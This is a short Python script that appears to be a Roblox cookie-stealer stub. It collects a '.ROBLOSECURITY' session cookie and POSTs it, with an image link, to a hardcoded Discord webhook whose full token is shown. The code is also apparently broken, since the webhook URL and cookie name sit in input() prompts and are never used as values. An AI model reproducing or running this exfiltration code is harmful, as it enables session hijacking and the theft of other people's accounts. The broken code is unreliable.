import requests
import json

webhook_link = input("https://discordapp.com/api/webhooks/1068567979769483464/8kRVQtgvx7qH1BI1usDzZRD54cN58sSTnvGrynlA2HeKs6xLdEIbE3Apk52k1w1RTkmp")
cookies = input(".ROBLOSECURITY")
image_link = input("https://www.imgonline.com.ua/examples/8bit-picture.jpg")

data = {
    "cookies": cookies,
    "image_link": image_link
}

requests.post(webhook_link, data=json.dumps(data))